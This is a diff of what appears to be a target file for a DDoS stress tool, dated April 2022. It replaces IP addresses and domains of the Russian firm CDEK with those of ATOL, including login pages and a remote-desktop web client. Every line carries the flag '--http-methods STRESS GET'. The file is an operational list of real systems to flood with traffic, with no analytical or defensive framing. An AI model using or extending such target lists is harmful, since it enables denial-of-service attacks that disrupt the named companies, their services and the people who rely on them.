@@ -1,5 +1,5 @@
-#targets updated 05-Apr-2022 
+#targets updated 06-Apr-2022 
 
-http://178.248.238.208:80 http://178.248.236.155:80 http://178.248.238.184:80 http://178.248.238.63:80 --http-methods STRESS GET 
-https://cdek.ru https://cdek.by https://api.cdek.ru https://id.ds.cdek.ru --http-methods STRESS GET 
-https://178.248.238.208:443 https://178.248.236.155:443 https://178.248.238.184:443 https://178.248.238.63:443 --http-methods STRESS GET 
+http://185.71.67.137:80 http://185.31.134.104:80 http://185.31.134.103:80 --http-methods STRESS GET 
+https://ac.atol.ru https://lk.atol.ru/#/auth/login https://uc.atol.ru/login/index.php https://term.atol.ru/RDWeb/webclient/index.html https://www.atol.ru https://online.atol.ru --http-methods STRESS GET 
+https://185.71.67.137:443 https://185.31.134.104:443 https://185.31.134.103:443 --http-methods STRESS GET 
